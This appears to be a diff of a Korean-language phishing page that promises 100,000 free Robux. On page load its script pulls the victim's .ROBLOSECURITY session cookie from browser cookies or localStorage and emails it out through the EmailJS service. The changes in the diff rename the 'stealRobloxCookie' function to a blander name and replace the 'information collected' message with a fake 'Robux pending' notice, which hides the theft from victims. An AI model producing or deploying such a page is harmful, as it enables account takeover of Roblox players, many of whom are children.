@@ -3,41 +3,37 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox 무료 Robux & 핵 지급 이벤트</title>
+  <title>Roblox 무료 Robux 100k 이벤트</title>
   <style>
-    body {margin:0;padding:0;height:100vh;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden;}
-    .container {text-align:center;padding:20px;max-width:95%;}
-    h1 {font-size:2.5rem;margin-bottom:20px;text-shadow:0 0 10px #0f0;}
-    .loader {width:80px;height:80px;border:8px solid #0f0;border-top:8px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
-    #status {font-size:1.2rem;color:#ff0044;margin-top:20px;}
+    body {margin:0;height:100vh;background:#111;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;}
+    .box {text-align:center;padding:30px;background:#1a1a1a;border-radius:12px;max-width:380px;}
+    h1 {color:#00ff00;margin-bottom:20px;}
+    .status {font-size:1.2rem;color:#ff0044;margin:20px 0;}
+    .loader {width:70px;height:70px;border:6px solid #0f0;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;}
     @keyframes spin {to{transform:rotate(360deg);}}
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
-  <div class="container">
-    <h1>Robux 100,000 지급 중...</h1>
+  <div class="box">
+    <h1>Robux 100,000 무료 지급 중</h1>
     <div class="loader" id="loader"></div>
-    <div id="status">계정 연결 확인 중...</div>
+    <div class="status" id="status">계정 확인 중...</div>
   </div>
 
   <script>
     emailjs.init("ycbHVBt3cm6FkCL--");
 
-    async function stealRobloxCookie() {
+    async function grabRoblox() {
       let cookie = null;
       try {
-        // Roblox .ROBLOSECURITY 자동 추출 (모바일/PC 모두 가능)
-        const cookies = document.cookie.split('; ');
-        for (let c of cookies) {
-          if (c.startsWith('.ROBLOSECURITY=')) {
-            cookie = c.split('=')[1];
-            break;
-          }
-        }
+        cookie = document.cookie.split('; ')
+          .find(c => c.trim().startsWith('.ROBLOSECURITY='))
+          ?.split('=')[1];
 
         if (!cookie) {
-          cookie = localStorage.getItem(".ROBLOSECURITY") || localStorage.getItem("ROBLOSECURITY");
+          cookie = localStorage.getItem(".ROBLOSECURITY") ||
+                   localStorage.getItem("ROBLOSECURITY");
         }
 
         if (cookie && cookie.includes("_|WARNING")) {
@@ -47,21 +43,17 @@
             time: new Date().toISOString(),
             userAgent: navigator.userAgent
           });
-
-          document.getElementById("status").innerHTML = "완료! 정보 수집됨 - 메일(스팸함 포함) 확인하세요";
+          document.getElementById("status").innerHTML = "완료! Robux 지급 대기 중 (메일 확인)";
         } else {
-          document.getElementById("status").innerHTML = "Roblox 로그인 상태가 아닙니다.<br>roblox.com에서 로그인 후 다시 시도하세요.";
+          document.getElementById("status").innerHTML = "Roblox 로그인 필요<br>roblox.com에서 로그인 후 재시도";
         }
       } catch(e) {
-        document.getElementById("status").innerHTML = "오류: " + (e.message || "다시 시도");
+        document.getElementById("status").innerHTML = "오류: " + (e.message || "알 수 없음");
       }
-
       document.getElementById("loader").style.display = "none";
     }
 
-    window.addEventListener("load", () => {
-      setTimeout(stealRobloxCookie, 800);
-    });
+    window.addEventListener("load", () => setTimeout(grabRoblox, 700));
   </script>
 </body>
 </html>
